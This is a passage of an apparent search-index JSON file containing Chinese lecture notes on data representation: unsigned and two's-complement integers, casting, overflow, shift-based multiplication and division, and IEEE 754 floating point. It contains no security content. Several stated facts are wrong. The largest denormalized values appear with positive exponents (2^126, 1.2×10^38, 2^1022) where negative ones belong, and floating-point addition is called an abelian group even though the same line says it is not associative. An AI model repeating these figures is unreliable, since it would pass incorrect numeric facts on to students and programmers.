\uff0c\u5176\u4e2d \\(f = 0.f_{n-1}\\cdots f_1f_0\\in[0, 1)\\) \uff0c\u56e0\u6b64 \\(M=1.f_{n-1}\\cdots f_1f_0\\in[1, 2)\\) \u8ba1\u7b97\u540e\u518d\u901a\u8fc7 \\(V = (-1)^s\\times M\\times 2^E\\) \u5373\u53ef\u8ba1\u7b97\u51fa\u6240\u8868\u793a\u7684\u503c \u89c4\u7ea6\u5f62\u5f0f\u53ef\u4ee5\u8868\u793a\u7684\u6240\u6709\u6570\u7684\u95f4\u8ddd\u662f\u4e0d\u4e00\u81f4\u7684\uff0c\u4e14\u8d8a\u63a5\u8fd1 0 \u8d8a\u5bc6\u96c6 \u5728\u89c4\u7ea6\u5f62\u5f0f\u4e0b\u53ef\u4ee5\u8868\u793a\u7684\u6570\u7684\u8303\u56f4\uff1a \u5355\u7cbe\u5ea6 \u6700\u5c0f\u6b63\uff080 0...01 0...00\uff09 \\(1\\times 2^{-126}\\) \uff08 \\(1.2\\times 10^{-38}\\) \uff09 \u6700\u5927\u6b63\uff080 1...10 1...11\uff09 \\((2-2^{-23})\\times 2^{127}\\) \uff08 \\(3.4\\times 10^{38}\\) \uff09 \u53cc\u7cbe\u5ea6 \u6700\u5c0f\u6b63\uff080 0...01 0...00\uff09 \\(1\\times 2^{-1022}\\) \uff08 \\(2.2\\times 10^{-308}\\) \uff09 \u6700\u5927\u6b63\uff080 1...10 1...11\uff09 \\((2-2^{-52})\\times 2^{1023}\\) \uff08 \\(1.8\\times 10^{308}\\) \uff09 \u975e\u89c4\u7ea6\u5f62\u5f0f \u00b6 \u5728\u8fd9\u79cd\u5f62\u5f0f\u4e0b\u9636\u7801\u5168\u4e3a 0\uff0c\u8fd9\u79cd\u5f62\u5f0f\u7684\u76ee\u7684\u662f\u8868\u793a 0 \u4ee5\u53ca\u63a5\u8fd1 0 \u7684\u503c \u540c\u6837 \\(s\\) \u76f4\u63a5\u8868\u793a\u6b63\u8d1f\uff0c \\(E\\) \u3001 \\(M\\) \uff1a \\(E = 1 - Bias = -2^{k-1} + 2\\) \\(M = f = 0.f_{n-1}\\cdots f_1f_0\\) \u800c\u5728\u6d6e\u70b9\u6570\u8868\u793a\u6cd5\u4e0b\uff0c0 \u6709\u4e24\u79cd\uff0c\u5373 \\(s=0\\) \u4e14\u540e\u9762\u5168\u4e3a 0 \u7684 +0.0\uff0c\u4ee5\u53ca \\(s=1\\) \u4e14\u540e\u9762\u5168\u4e3a 0 \u7684 -0.0 \u5b83\u4eec\u6709\u65f6\u89c6\u4e3a\u76f8\u7b49\uff0c\u4f46\u4e5f\u6709\u65f6\u4f1a\u89c6\u4e3a\u4e0d\u76f8\u7b49 \u975e\u89c4\u7ea6\u5f62\u5f0f\u8868\u793a\u7684\u6240\u6709\u6570\u7684\u95f4\u8ddd\u662f\u4e00\u81f4\u7684\uff0c\u5b83\u4eec\u7684\u95f4\u8ddd\u4e5f\u5c31\u662f\u7528\u975e\u89c4\u7ea6\u5f62\u5f0f\u53ef\u8868\u793a\u7684\u6700\u5c0f\u6b63\u6570 \\(2^{-n}\\times 2^{-2^{k-1}+2}\\) \u975e\u89c4\u7ea6\u5f62\u5f0f\u53ef\u8868\u793a\u7684\u6570\u7684\u8303\u56f4\uff1a \u5355\u7cbe\u5ea6 \u6700\u5c0f\u6b63\uff080 0...00 0...01\uff09 \\(2^{-23}\\times 2^{-126}\\) \uff08 \\(1.4\\times 10^{-45}\\) \uff09 \u6700\u5927\u6b63\uff080 0...00 1...11\uff09 \\((1-2^{-23})\\times 2^{126}\\) \uff08 \\(1.2\\times 10^{38}\\) \uff09 \u53cc\u7cbe\u5ea6 \u6700\u5c0f\u6b63\uff080 0...00 0...01\uff09 \\(2^{-52}\\times 2^{-1022}\\) \uff08 \\(4.9\\times 10^{-324}\\) \uff09 \u6700\u5927\u6b63\uff080 0...00 1...11\uff09 \\((1-2^{-52})\\times 2^{1022}\\) \uff08 \\(2.2\\times 10^{-308}\\) \uff09 \u7279\u6b8a\u503c \u00b6 \u6d6e\u70b9\u6570\u4e5f\u53ef\u4ee5\u7528\u6765\u8868\u793a\u4e00\u4e9b\u7279\u6b8a\u503c\uff0c\u5373 \\(+\\infty\\) \u3001 \\(-\\infty\\) \u4ee5\u53ca NaN\uff08not a number\uff09 \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u9636\u7801\u5168\u4e3a 1\uff0c\u5177\u4f53\u4e09\u79cd\u60c5\u51b5\uff1a \u5206\u6570\u90e8\u5206\u5168\u4e3a 0\uff0c\u4e14 \\(s=0\\) \uff0c\u8868\u793a \\(+\\infty\\) \u5206\u6570\u90e8\u5206\u5168\u4e3a 0\uff0c\u4e14 \\(s=1\\) \uff0c\u8868\u793a \\(-\\infty\\) \u5206\u6570\u90e8\u5206\u4e0d\u5168\u4e3a 0\uff0c\u8868\u793a NaN \u820d\u5165 \u00b6 \u820d\u5165\uff08rounding\uff09\u6709\u56db\u79cd\uff1a\u5411\u5076\u820d\u5165\uff08round-to-even\uff09\u3001\u5411 0 \u820d\u5165\uff08round-toward-zero\uff09\u3001\u5411\u4e0b\u820d\u5165\uff08round-down\uff09\u3001\u5411\u4e0a\u820d\u5165\uff08round-up\uff09 \u9ed8\u8ba4\u662f round-to-even \u5982\u679c\u6709\u4e00\u4e2a\u4e8c\u8fdb\u5236\u5c0f\u6570\uff1aX...XX.Y...Yabcd...\uff0c\u8981\u820d\u5165\u5230 a \u7684\u4f4d\u7f6e \u5982\u679c bcd \u5c0f\u4e8e 100 2 \uff0c\u5219\u76f4\u63a5\u820d\u53bb bcd \u5982\u679c bcd \u5927\u4e8e 100 2 \uff0c\u5219\u5411 a \u8fdb\u4e00\u4f4d \u5982\u679c bcd \u7b49\u4e8e 100 2 \u5982\u679c a \u4e3a 0\uff08\u5076\uff09\uff0c\u5219\u820d\u53bb bcd \u5982\u679c a \u4e3a 1\uff08\u5947\uff09\uff0c\u5219\u5411 a \u8fdb\u4e00\u4f4d \u6d6e\u70b9\u6570\u52a0\u6cd5 \u00b6 \u4f1a\u5b58\u5728\u820d\u5165\u95ee\u9898 \u662f\u963f\u8d1d\u5c14\u7fa4\uff0c\u6ee1\u8db3\u4ea4\u6362\u5f8b\uff0c\u4f46\u4e0d\u6ee1\u8db3\u7ed3\u5408\u5f8b","title":"\u6570\u636e\u7684\u8868\u793a"},{"location":"cs/system/cs1/topic1/#_1","text":"Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u7b2c\u4e8c\u5468\u8bfe\u7a0b\u5185\u5bb9 \u53c2\u8003\uff1a Computer System: A Programmer's Perspective (3rd.) Chapter 2: Representing and Manipulating Information","title":"\u6570\u5b57\u7684\u8868\u793a\u548c\u5904\u7406"},{"location":"cs/system/cs1/topic1/#_2","text":"","title":"\u6574\u6570\u8868\u793a\u6cd5"},{"location":"cs/system/cs1/topic1/#_3","text":"\u65e0\u7b26\u53f7\u6574\u578b\u4e00\u822c\u76f4\u63a5\u4f7f\u7528\u5176\u4e8c\u8fdb\u5236\uff08\u539f\u7801\uff09\u6765\u8868 \u6bd4\u5982\u6709\u4e00\u4e2a \\(w\\) \u4f4d\u7684\u6bd4\u7279\u5e8f\u5217 \\(\\overrightarrow{x}=[x_{w-1}, x_{w-2}, \\dots, x_0]\\) \uff0c\u5219\u5c06\u5176\u8f6c\u5316\u4e3a\u65e0\u7b26\u53f7\u6574\u6570\uff1a \\[ B2U_w(\\overrightarrow{x}) = \\sum_{i=0}^{w-1}x_i2^i \\] \u53ef\u4ee5\u77e5\u9053 B2U \u662f\u4e00\u4e2a\u53cc\u5c04 \u540c\u65f6\u4e5f\u5bb9\u6613\u77e5\u9053\u65e0\u7b26\u53f7\u6574\u578b\u53ef\u8868\u793a\u7684\u6700\u5927\u503c\u4e3a \\(UMax_{w}=\\displaystyle\\sum_{i=0}^{w-1}2^i=2^w-1\\)","title":"\u65e0\u7b26\u53f7\u6574\u578b"},{"location":"cs/system/cs1/topic1/#_4","text":"\u6700\u5e38\u7528\u7684\u8868\u793a\u6709\u7b26\u53f7\u6574\u578b\u7684\u65b9\u6cd5\u662f\u8865\u7801\uff08Two's-Complement\uff09 \u5bf9\u4e8e\u6bd4\u7279\u5e8f\u5217 \\(\\overrightarrow{x}=[x_{w-1}, x_{w-2}, \\dots, x_0]\\) \uff0c\u5c06\u5176\u89c6\u4e3a\u8865\u7801\u8f6c\u6362\u4e3a\u6709\u7b26\u53f7\u6574\u6570\uff1a \\[ B2T_w(\\overrightarrow{x}) = -x_{w-1}2^{w-1} + \\sum_{i=0}^{w-2}x_i2^i \\] \u5b83\u7684\u6700\u9ad8\u4f4d\uff08MSB\uff09\u662f\u7b26\u53f7\u4f4d\uff0c\u5982\u679c\u662f 1 \u5219\u8868\u793a\u662f\u8d1f\u6570\uff0c0 \u5219\u662f\u6b63\u6570 \u5e76\u4e14\u5bf9\u4e8e\u6b63\u6570\uff0c\u5b83\u5bf9\u5e94\u7684\u6bd4\u7279\u5e8f\u5217\u5c31\u662f\u5176\u4e8c\u8fdb\u5236 \u800c\u5bf9\u4e8e\u8d1f\u6570\uff0c\u5219\u4f7f\u7528\u8865\u7801\uff0c\u5373 \\(-x = \\sim x + 1 (x > 0)\\) \u4ece\u53e6\u4e00\u4e2a\u89d2\u5ea6\u6765\u770b\uff0c\u5b83\u5b9e\u9645\u4e0a\u5c31\u662f\u6539\u53d8\u4e86 MSB \u7684\u6743\u91cd\uff0c\u4ece \\(2^{w-1}\\) \u6539\u4e3a\u4e86 \\(-2^{w-1}\\) \u540c\u65f6\u4e5f\u53ef\u4ee5\u8ba1\u7b97\u51fa\u8865\u7801\u53ef\u4ee5\u8868\u793a\u7684\u8303\u56f4 \\(TMin_w=-2^{w-1}\\) \uff0c \\(TMax_w=2^{w-1}-1\\)","title":"\u6709\u7b26\u53f7\u6574\u578b\u8865\u7801\u8868\u793a"},{"location":"cs/system/cs1/topic1/#_5","text":"\u53cd\u7801\uff08Ones' complement\uff09\u4e5f\u662f\u8868\u793a\u6709\u7b26\u53f7\u6574\u578b\u7684\u4e00\u79cd\u65b9\u6cd5\uff0c\u4f46\u662f\u5e76\u4e0d\u5e38\u7528 \u5bf9\u4e8e\u6bd4\u7279\u5e8f\u5217 \\(\\overrightarrow{x}=[x_{w-1}, x_{w-2}, \\dots, x_0]\\) \uff0c\u5c06\u5176\u89c6\u4e3a\u53cd\u7801\u8f6c\u6362\u4e3a\u6709\u7b26\u53f7\u6574\u6570\uff1a \\[ B2O_w(\\overrightarrow{x}) = -x_{w-1}(2^{w-1}-1) + \\sum_{i=0}^{w-2}x_i2^i \\] \u76f8\u8f83\u4e8e\u8865\u7801\uff0c\u5b83\u4eec\u5728\u6b63\u6570\u4e0a\u662f\u4e00\u6837\u7684 \u4f46\u662f\u5bf9\u4e8e\u8d1f\u6570\uff0c\u53cd\u7801\u8868\u793a\u4e0b\u662f \\(-x = \\sim x (x > 0)\\) \u5728\u53e6\u4e00\u4e2a\u89d2\u5ea6\uff0c\u5b83\u7684 MSB \u7684\u6743\u91cd\u662f \\(2^{w-1}-1\\) \u5b83\u7684\u7f3a\u70b9\u662f 0 \u6709\u4e24\u79cd\u8868\u793a\uff0c\u5373 +0 [00...0] \u548c -0 [11...1]","title":"\u6709\u7b26\u53f7\u6574\u578b\u53cd\u7801\u8868\u793a"},{"location":"cs/system/cs1/topic1/#_6","text":"C \u8bed\u8a00\u4e2d\u5f3a\u5236\u8f6c\u6362\u6709\u7b26\u53f7\u548c\u65e0\u7b26\u53f7\u6574\u578b\u5e76\u4e0d\u6539\u53d8\u6bd4\u7279\u5e8f\u5217\uff0c\u800c\u662f\u6539\u53d8\u8bfb\u53d6\u7684\u65b9\u5f0f \u5373\u4ece\u6709\u7b26\u53f7\u8f6c\u4e3a\u65e0\u7b26\u53f7\u5c31\u662f\u901a\u8fc7\u539f\u7801\u6765\u89e3\u8bfb\u539f\u6765\u8865\u7801\u7684\u4e8c\u8fdb\u5236 \u4ece\u65e0\u7b26\u53f7\u8f6c\u4e3a\u6709\u7b26\u53f7\u5c31\u662f\u901a\u8fc7\u8865\u7801\u89e3\u8bfb\u539f\u6765\u539f\u7801\u7684\u4e8c\u8fdb\u5236 \\[ T2U_w(x) = B2U_w(T2B_w(x)) \\] \u5e76\u4e14\u53ef\u4ee5\u53d1\u73b0\u539f\u7801\u548c\u8865\u7801\u53ea\u5dee\u4e86 MSB \u7684\u6743\u91cd\u4ece\u6b63\u5230\u8d1f\uff0c\u6240\u4ee5 \\(T2U_w(x) = x + x_{w-1}2^w\\) \uff0c\u4e5f\u5c31\u662f\uff1a \\[ T2U_w(x) = \\begin{cases}x+2^w, &x<0\\\\x, &x\\geq 0\\end{cases} \\] \u5bf9\u4e8e\u65e0\u7b26\u53f7\u8f6c\u6709\u7b26\u53f7\uff1a \\[ U2T_w(x) = B2T_w(U2B_w(x)) \\] \u540c\u65f6\uff1a \\[ U2T_w(x) = \\begin{cases}x, &x\\leq TMax_w=2^{w-1}-1\\\\x-2^w, &x > TMax_w=2^{w-1}-1\\end{cases} \\]","title":"\u65e0\u7b26\u53f7\u4e0e\u6709\u7b26\u53f7\u8f6c\u6362"},{"location":"cs/system/cs1/topic1/#_7","text":"","title":"\u6574\u6570\u8fd0\u7b97"},{"location":"cs/system/cs1/topic1/#_8","text":"\u5bf9\u4e8e\u4e24\u4e2a\u65e0\u7b26\u53f7\u6574\u578b \\(x, y\\in[0, 2^w)\\) \uff0c\u5b83\u4eec\u505a\u52a0\u6cd5\u540e\u7684\u7ed3\u679c\u5728 \\(w+1\\) \u4f4d\u4e0b\u624d\u80fd\u5b8c\u5168\u8868\u793a\u51fa\u6765 \u4f46\u662f\u7ed3\u679c\u4e00\u5b9a\u8fd8\u8981\u8868\u793a\u5728 \\(w\\) \u4f4d\u4e0b\u8868\u793a\uff0c\u8fd9\u65f6\u5c31\u8981\u5bf9\u6ea2\u51fa\u90e8\u5206\u622a\u65ad\uff0c\u5373\u76f4\u63a5\u53bb\u6389\u6700\u9ad8\u4f4d \\[ x+_w^\\mathrm{u}y = (x+y)\\bmod{2^w} \\] \u5373\uff1a \\[ x+_w^\\mathrm{u}y = \\begin{cases} x + y, &x + y < 2^w\\quad \\text{Normal}\\\\ x + y - 2^w, &2^w\\leq x + y < 2^{w + 1}\\quad \\text{Overflow} \\end{cases} \\]","title":"\u65e0\u7b26\u53f7\u6574\u578b\u52a0\u6cd5"},{"location":"cs/system/cs1/topic1/#_9","text":"\u51cf\u6cd5\u5373\u52a0\u4e0a\u51cf\u6570\u53d6\u8d1f\uff0c\u6240\u4ee5\u53ea\u8981\u77e5\u9053\u5982\u4f55\u53d6\u8d1f\u5373\u53ef \u5bf9\u4e8e 0\uff0c\u53d6\u8d1f\u540e\u4e00\u5b9a\u4e5f\u4e3a 0 \u800c\u5bf9\u4e8e\u975e 0 \u6570\uff0c\u56e0\u4e3a\u53d6\u8d1f\u540e\u52a0\u4e0a\u539f\u6570\u4e3a 0\uff08 \\(2^w\\) \u622a\u65ad\u540e\uff09\uff0c\u6240\u4ee5\u53d6\u8d1f\u5373\u7528 \\(2^w\\) \u51cf\u53bb\u539f\u6570\uff1a \\[ -_w^\\mathrm{u}x = \\begin{cases}x, &x=0\\\\2^w-x, &x>0\\end{cases} \\]","title":"\u65e0\u7b26\u53f7\u6574\u578b\u51cf\u6cd5"},{"location":"cs/system/cs1/topic1/#_10","text":"\u4f7f\u7528\u8865\u7801\u8868\u793a\u6709\u7b26\u53f7\u6574\u578b\u8fdb\u884c\u52a0\u6cd5\u65f6\uff0c\u4f1a\u9047\u5230\u4e24\u79cd\u7279\u6b8a\u60c5\u51b5\uff1a \u52a0\u6cd5\u540e\u7684\u7ed3\u679c\u592a\u5927\uff0c\u8d85\u8fc7 \\(2^{w-1} - 1\\) \uff0c\u6b63\u6ea2\u51fa\uff08Positive overflow\uff09 \u52a0\u6cd5\u540e\u7684\u7ed3\u679c\u592a\u5c0f\uff0c\u5c0f\u4e8e \\(-2^{w-1}\\) \uff0c\u8d1f\u6ea2\u51fa\uff08Negative overflow\uff09 \u6240\u4ee5\u4e5f\u9700\u8981\u5bf9\u7ed3\u679c\u8fdb\u884c\u622a\u65ad\u5904\u7406\uff1a \\[ x+_w^\\mathrm{t}y = \\begin{cases} x+y-2^w, & 2^{w-1}\\leq x + y \\quad \\text{Positive overflow}\\\\ x+y, &-2^{w-1}\\leq x+y < 2^{w-1}\\quad \\text{Normal}\\\\ x+y+2^w, &x+y < -2^{w-1}\\quad \\text{Negative overflow} \\end{cases} \\] \u4ece\u6bd4\u7279\u5e8f\u5217\u89d2\u5ea6\u6765\u770b\uff0c\u4e5f\u5c31\u662f\u76f4\u63a5\u89c6\u4e3a\u4e8c\u8fdb\u5236\u5e8f\u5217\u76f8\u52a0\uff0c\u518d\u8f6c\u56de\u8865\u7801\u8868\u793a\u7684\u503c\uff1a \\[ x+_w^\\mathrm{t}y=U2T_w(T2U_w(x)+_w^\\mathrm{u}T2U_w(y)) \\]","title":"\u8865\u7801\u8868\u793a\u4e2d\u52a0\u6cd5"},{"location":"cs/system/cs1/topic1/#_11","text":"\u540c\u6837\uff0c\u4e5f\u662f\u53ea\u8003\u8651\u53d6\u8d1f\u5373\u53ef \u4f46\u662f\u548c\u539f\u7801\u4e0d\u540c\uff0c\u5b83\u672c\u8eab\u5c31\u5e26\u6b63\u8d1f\uff0c\u6240\u4ee5\u53d6\u8d1f\u5219\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\uff08\u5373\u53d6\u53cd\u52a0\u4e00\uff09 \u4f46\u6709\u4e00\u4e2a\u7279\u6b8a\uff0c\u4e5f\u5c31\u662f\u6700\u5c0f\u7684 \\(-2^{w-1}\\) \uff0c\u8d1f\u7684\u5b83 \\(2^{w-1}\\) \u5e76\u4e0d\u5728\u8865\u7801\u7684\u8303\u56f4\u4e2d \u800c \\(TMin_w+_w^\\mathrm{t}TMin_w=-2^{w-1}-2^{w-1}=-2^w\\) \uff0c\u622a\u65ad\u540e\u6070\u597d\u4e3a 0 \u6240\u4ee5 \\(-TMin_w = TMin_w\\) \uff0c\u5373\uff1a \\[ -_w^\\mathrm{t}x = \\begin{cases} -2^{w-1}, &x = -2^{w-1}\\\\ -x, &x > -2^{w-1} \\end{cases} \\]","title":"\u8865\u7801\u8868\u793a\u4e2d\u7684\u51cf\u6cd5"},{"location":"cs/system/cs1/topic1/#_12","text":"\u6574\u578b\u7684\u4e58\u6cd5\u5747\u662f\u76f4\u63a5\u5c06\u539f\u7801/\u8865\u7801\u7684\u4e8c\u8fdb\u5236\u76f8\u4e58\uff0c\u7136\u540e\u76f4\u63a5\u622a\u65ad\u81f3 \\(w\\) \u4f4d \\[ x*_w^\\mathrm{t}y = U2T_w(x*_w^\\mathrm{u}y) = U2T_w(x*y\\bmod 2^w) \\] \u5e76\u4e14\u4e58\u4ee5\u5e38\u6570\u53ef\u4ee5\u901a\u8fc7\u79fb\u4f4d\u6765\u8fdb\u884c\uff0c\u6bd4\u5982\uff1a x * 2 k = x < < k x * 14 = (x < < 3) + (x < < 2) + (x < < 1)","title":"\u4e58\u6cd5"},{"location":"cs/system/cs1/topic1/#_13","text":"","title":"\u9664\u4ee5\u4e8c\u7684\u5e42\u6b21"},{"location":"cs/system/cs1/topic1/#unsigned","text":"\u65e0\u7b26\u53f7\u6574\u578b\u9664\u4ee5\u4e8c\u7684\u5e42\u6b21\u5219\u76f4\u63a5\u8fdb\u884c\u53f3\u79fb\uff1a x / 2 k = x >> k \u5e76\u4e14\u662f\u5411\u4e0b\u53d6\u6574","title":"Unsigned"},{"location":"cs/system/cs1/topic1/#signed","text":"\u8865\u7801\u8868\u793a\u7684\u6709\u7b26\u53f7\u6574\u578b\u9664\u4ee5\u4e8c\u7684\u5e42\u6b21\uff0c\u8fdb\u884c\u6570\u503c\u53f3\u79fb\uff0c\u4f46\u662f\u76f4\u63a5\u53f3\u79fb\u8fdb\u884c\u7684\u662f\u5411\u4e0b\u53d6\u6574 \u800c\u5bf9\u4e8e\u6709\u7b26\u53f7\u6574\u578b\u9664\u6cd5\u4e00\u822c\u8981\u5411 0 \u53d6\u6574\uff0c\u6240\u4ee5\u5bf9\u4e8e\u8d1f\u6570\u8981\u5411\u4e0a\u53d6\u6574 \u5411\u4e0a\u53d6\u6574\u8981\u5148\u52a0\u4e0a\u4e00\u4e2a bias \u7136\u540e\u518d\u53f3\u79fb\uff0cbias = 2 k - 1\uff0c\u5373 x / 2 k \u5411\u4e0a\u53d6\u6574\u8981\u8fdb\u884c (x + (1 << k) - 1) >> k \u6240\u4ee5\u5411 0 \u53d6\u6574\uff1a (x < 0 ? (x + (1 < < k) - 1) : x) >> k","title":"Signed"},{"location":"cs/system/cs1/topic1/#_14","text":"\u524d\u9762\u7684\u6574\u578b\u90fd\u662f\u4e00\u79cd\u5b9a\u70b9\u6570\uff08fixed point\uff09\uff0c\u5373\u5c0f\u6570\u70b9\u7684\u4f4d\u7f6e\u662f\u56fa\u5b9a\u7684\uff08\u56fa\u5b9a\u5728\u672b\u5c3e\uff09\uff0c\u5b83\u7684\u7f3a\u70b9\u662f\u8303\u56f4\u56fa\u5b9a \u800c\u6d6e\u70b9\u6570\uff08floating point\uff09\u7684\u5c0f\u6570\u70b9\u4f4d\u7f6e\u5219\u4e0d\u662f\u56fa\u5b9a\u7684\uff0c\u5b83\u4f7f\u7528 \\(x*2^y\\) \u7684\u5f62\u5f0f\u6765\u8868\u793a\u4e00\u4e2a\u6570 \u4e5f\u56e0\u6b64\u53ef\u4ee5\u8868\u793a\u5f88\u5927\u6216\u8005\u5f88\u5c0f\u7684\u6570 \u5e38\u7528\u7684\u6d6e\u70b9\u6570\u8868\u793a\u65b9\u6cd5\u662f\u7531 IEEE 754 \u6807\u51c6\u6307\u5b9a\u7684 IEEE \u6d6e\u70b9\u6570\u8868\u793a\u6cd5\u90fd\u901a\u8fc7 \\(V=(-1)^s\\times M\\times 2^E\\) \u7684\u5f62\u5f0f\u6765\u8868\u793a\uff0c\u5176\u4e2d\uff1a \\(s\\) \uff1a\u7b26\u53f7\uff08sign\uff09\uff0c1 \u5219\u8868\u793a\u662f\u8d1f\u6570\uff0c0 \u5219\u8868\u793a\u662f\u6b63\u6570 \\(M\\) \uff1a\u5c3e\u6570\uff08mantissa\uff09\u6216\u79f0\u6709\u6548\u6570\u5b57\uff08significand\uff09 \\(E\\) \uff1a\u6307\u6570\uff08exponent\uff09 \u5b83\u4eec\u7684\u5b58\u50a8\u65b9\u5f0f\u662f\uff1a \u6700\u9ad8\u4f4d\u6bd4\u7279\u8868\u793a \\(s\\) \u540e\u63a5 \\(k\\) \u6bd4\u7279 \\([e_{k-1}\\cdots e_1e_0]\\) \u6307\u6570\u90e8\u5206\uff08\u4e5f\u79f0\u4e3a\u9636\u7801\uff09\u7f16\u7801\u4e86 \\(E\\) \u6700\u540e\u662f \\(n\\) \u4e2a\u6bd4\u7279 \\([f_{n-1}\\cdots f_1f_0]\\) \u5206\u6570\u90e8\u5206\uff0c\u7f16\u7801\u4e86 \\(M\\) \u5e76\u4e14\u6709\u4e24\u79cd\u6700\u5e38\u89c1\u7684\u683c\u5f0f\uff0c\u5373\uff1a \u5355\u7cbe\u5ea6\uff08single-precision floating-point\uff09\uff0c \\(k=8\\) \uff0c \\(n=23\\) \uff0c32 \u4f4d\uff084 \u5b57\u8282\uff09\u5b58\u50a8 \u53cc\u7cbe\u5ea6\uff08double-precision floating-point\uff09\uff0c \\(k=11\\) \uff0c \\(n=52\\) \uff0c64 \u4f4d\uff088 \u5b57\u8282\uff09\u5b58\u50a8 IEEE \u6d6e\u70b9\u6570\u503c\u8fd8\u6709\u4e09\u79cd\u5f62\u5f0f\uff0c\u4e0b\u9762\u5206\u522b\u63cf\u8ff0","title":"\u6d6e\u70b9\u6570\u8868\u793a\u6cd5"},{"location":"cs/system/cs1/topic1/#_15","text":"\u8fd9\u79cd\u5f62\u5f0f\u4e0b\u7684\u9636\u7801\u4e0d\u5168\u4e3a 0 \u4e5f\u4e0d\u5168\u4e3a 1\uff0c\u662f\u6700\u5e38\u89c1\u7684\u5f62\u5f0f \u8fd9\u79cd\u5f62\u5f0f\u4e0b\u7684 \\(s\\) \u76f4\u63a5\u8868\u793a\u6b63\u8d1f\uff0c\u800c \\(E\\) \u3001 \\(M\\) \u7684\u89c4\u5219\uff1a \\(E\\) \u901a\u8fc7 \u79fb\u7801 \uff08biased\uff09\u8868\u793a\u6210 \u9636\u7801 \\([e_{k-1}\\cdots e_1e_0]\\) \uff0c\u79fb\u4f4d \\(Bias = 2^{k-1}-1\\) \uff0c \\(E = e - Bias\\) \uff08\u5176\u4e2d \\(e\\) \u4e3a\u5c06\u9636\u7801\u8f6c\u4e3a\u65e0\u7b26\u53f7\u6574\u578b\u7684\u503c\uff09\uff0c\u8fd9\u53ef\u4ee5\u4f7f\u9636\u7801\u90e8\u5206\u8303\u56f4\u4ece \\([1, 2^k-2]\\) \u53d8\u4e3a \\([-2^{k-1}+2, 2^{k-1}-1]\\) \\(M = 1+f\\) \uff0c\u5176\u4e2d \\(f = 0.f_{n-1}\\cdots f_1f_0\\in[0, 1)\\) \uff0c\u56e0\u6b64 \\(M=1.f_{n-1}\\cdots f_1f_0\\in[1, 2)\\) \u8ba1\u7b97\u540e\u518d\u901a\u8fc7 \\(V = (-1)^s\\times M\\times 2^E\\) \u5373\u53ef\u8ba1\u7b97\u51fa\u6240\u8868\u793a\u7684\u503c \u89c4\u7ea6\u5f62\u5f0f\u53ef\u4ee5\u8868\u793a\u7684\u6240\u6709\u6570\u7684\u95f4\u8ddd\u662f\u4e0d\u4e00\u81f4\u7684\uff0c\u4e14\u8d8a\u63a5\u8fd1 0 \u8d8a\u5bc6\u96c6 \u5728\u89c4\u7ea6\u5f62\u5f0f\u4e0b\u53ef\u4ee5\u8868\u793a\u7684\u6570\u7684\u8303\u56f4\uff1a \u5355\u7cbe\u5ea6 \u6700\u5c0f\u6b63\uff080 0...01 0...00\uff09 \\(1\\times 2^{-126}\\) \uff08 \\(1.2\\times 10^{-38}\\) \uff09 \u6700\u5927\u6b63\uff080 1...10 1...11\uff09 \\((2-2^{-23})\\times 2^{127}\\) \uff08 \\(3.4\\times 10^{38}\\) \uff09 \u53cc\u7cbe\u5ea6 \u6700\u5c0f\u6b63\uff080 0...01 0...00\uff09 \\(1\\times 2^{-1022}\\) \uff08 \\(2.2\\times 10^{-308}\\) \uff09 \u6700\u5927\u6b63\uff080 1...10 1...11\uff09 \\((2-2^{-52})\\times 2^{1023}\\) \uff08 \\(1.8\\times 10^{308}\\) \uff09","title":"\u89c4\u7ea6\u5f62\u5f0f"},{"location":"cs/system/cs1/topic1/#_16","text":"\u5728\u8fd9\u79cd\u5f62\u5f0f\u4e0b\u9636\u7801\u5168\u4e3a 0\uff0c\u8fd9\u79cd\u5f62\u5f0f\u7684\u76ee\u7684\u662f\u8868\u793a 0 \u4ee5\u53ca\u63a5\u8fd1 0 \u7684\u503c \u540c\u6837 \\(s\\) \u76f4\u63a5\u8868\u793a\u6b63\u8d1f\uff0c \\(E\\) \u3001 \\(M\\) \uff1a \\(E = 1 - Bias = -2^{k-1} + 2\\) \\(M = f = 0.f_{n-1}\\cdots f_1f_0\\) \u800c\u5728\u6d6e\u70b9\u6570\u8868\u793a\u6cd5\u4e0b\uff0c0 \u6709\u4e24\u79cd\uff0c\u5373 \\(s=0\\) \u4e14\u540e\u9762\u5168\u4e3a 0 \u7684 +0.0\uff0c\u4ee5\u53ca \\(s=1\\) \u4e14\u540e\u9762\u5168\u4e3a 0 \u7684 -0.0 \u5b83\u4eec\u6709\u65f6\u89c6\u4e3a\u76f8\u7b49\uff0c\u4f46\u4e5f\u6709\u65f6\u4f1a\u89c6\u4e3a\u4e0d\u76f8\u7b49 \u975e\u89c4\u7ea6\u5f62\u5f0f\u8868\u793a\u7684\u6240\u6709\u6570\u7684\u95f4\u8ddd\u662f\u4e00\u81f4\u7684\uff0c\u5b83\u4eec\u7684\u95f4\u8ddd\u4e5f\u5c31\u662f\u7528\u975e\u89c4\u7ea6\u5f62\u5f0f\u53ef\u8868\u793a\u7684\u6700\u5c0f\u6b63\u6570 \\(2^{-n}\\times 2^{-2^{k-1}+2}\\) \u975e\u89c4\u7ea6\u5f62\u5f0f\u53ef\u8868\u793a\u7684\u6570\u7684\u8303\u56f4\uff1a \u5355\u7cbe\u5ea6 \u6700\u5c0f\u6b63\uff080 0...00 0...01\uff09 \\(2^{-23}\\times 2^{-126}\\) \uff08 \\(1.4\\times 10^{-45}\\) \uff09 \u6700\u5927\u6b63\uff080 0...00 1...11\uff09 \\((1-2^{-23})\\times 2^{126}\\) \uff08 \\(1.2\\times 10^{38}\\) \uff09 \u53cc\u7cbe\u5ea6 \u6700\u5c0f\u6b63\uff080 0...00 0...01\uff09 \\(2^{-52}\\times 2^{-1022}\\) \uff08 \\(4.9\\times 10^{-324}\\) \uff09 \u6700\u5927\u6b63\uff080 0...00 1...11\uff09 \\((1-2^{-52})\\times 2^{1022}\\) \uff08 \\(2.2\\times 10^{-308}\\) \uff09","title":"\u975e\u89c4\u7ea6\u5f62\u5f0f"},{"location":"cs/system/cs1/topic1/#_17","text":"\u6d6e\u70b9\u6570\u4e5f\u53ef\u4ee5\u7528\u6765\u8868\u793a\u4e00\u4e9b\u7279\u6b8a\u503c\uff0c\u5373 \\(+\\infty\\) \u3001 \\(-\\infty\\) \u4ee5\u53ca NaN\uff08not a number\uff09 \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u9636\u7801\u5168\u4e3a 1\uff0c\u5177\u4f53\u4e09\u79cd\u60c5\u51b5\uff1a 